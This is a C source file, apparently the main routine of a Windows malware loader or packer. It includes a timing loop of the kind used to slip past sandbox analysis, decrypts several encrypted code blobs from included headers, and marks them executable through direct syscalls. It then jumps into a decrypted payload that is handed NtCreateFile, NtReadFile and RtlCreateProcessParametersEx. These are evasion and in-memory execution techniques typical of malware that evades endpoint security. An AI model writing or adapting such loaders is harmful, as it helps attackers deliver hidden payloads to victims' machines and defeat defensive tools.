#include <Windows.h>
#include <stdint.h>
#include <stdio.h>
#include "fun.h"

NTSYSAPI
NTSTATUS
NTAPI
RtlCreateProcessParametersEx(
    _Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags // Pass RTL_USER_PROCESS_PARAMETERS_NORMALIZED to keep parameters normalized
);

NTSTATUS NTAPI sys_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
//NTSTATUS NTAPI sys_NtCreateFile(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PIO_STATUS_BLOCK,PLARGE_INTEGER,ULONG,ULONG,ULONG,ULONG,PVOID,ULONG);
//NTSTATUS NTAPI sys_NtReadFile(HANDLE,HANDLE,PIO_APC_ROUTINE,PVOID,PIO_STATUS_BLOCK,PVOID,ULONG,PLARGE_INTEGER,PULONG);
//void sys_uni();

//char buf[] = {0x90, 0x90, 0x90, 0x90, 0xC3};

void decrypt(uint8_t *buf, size_t bufSize);

uint8_t loader[] = 
#include "loader.h"
;

uint8_t sys_protect[] =
#include "encfun/sys_protect.h"
;

uint8_t sys_create[] =
#include "encfun/sys_create.h"
;

uint8_t sys_read[] =
#include "encfun/sys_read.h"
;

uint8_t sys_uni[] =
#include "encfun/sys_uni.h"
;

uint8_t main_fun[] = 
#include "encfun/main.h"
;

int main(int argc, char *argv[]) {
	void *bufAddr;
	SIZE_T nBytes;
	DWORD oldProt;
	main_funs_t main_funs;
	SIZE_T i, n;

#ifndef DEBUG
	for (i = 0, n = 0; i < 0x7FFFFFFFF; ++i) {
		n += i;
	}
	decrypt((uint8_t*)&i, sizeof(i));
	n = ((uint64_t(*)(uint64_t, uint64_t))sys_NtProtectVirtualMemory)(n, i);
#endif

	//TODO: imports using GetProc
	//TODO: write sys_protect to sys_NtProtectVirtualMemory

	decrypt(loader, sizeof(loader));
	decrypt(sys_create, sizeof(sys_create));
	decrypt(sys_read, sizeof(sys_read));
	decrypt(sys_uni, sizeof(sys_uni));
	decrypt(main_fun, sizeof(main_fun));

	bufAddr = sys_create;
	nBytes = sizeof(sys_create);
	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);

	bufAddr = sys_read;
	nBytes = sizeof(sys_read);
	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);

	bufAddr = sys_uni;
	nBytes = sizeof(sys_uni);
	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);

	bufAddr = main_fun;
	nBytes = sizeof(main_fun);
	sys_NtProtectVirtualMemory(GetCurrentProcess(), &bufAddr, &nBytes, PAGE_EXECUTE_READ, &oldProt);

#ifndef DEBUG
	for (i = 0; i < sizeof(main_funs); ++i) {
		((uint8_t*)&main_funs)[i] = ((uint8_t*)&n)[i % sizeof(n)];
	}
#endif


	main_funs.NtCreateFile = (PVOID)sys_create;
	main_funs.NtReadFile = (PVOID)sys_read;
	main_funs.GetProcessHeap = GetProcessHeap;
	main_funs.RtlAllocateHeap = RtlAllocateHeap;
	main_funs.RtlInitUnicodeString = RtlInitUnicodeString;
	main_funs.RtlCreateProcessParametersEx = RtlCreateProcessParametersEx;
	main_funs.sys_uni = sys_uni;
	main_funs.loader = loader;

	(*(void(*)(main_funs_t*))main_fun)(&main_funs);

	return 0;
}
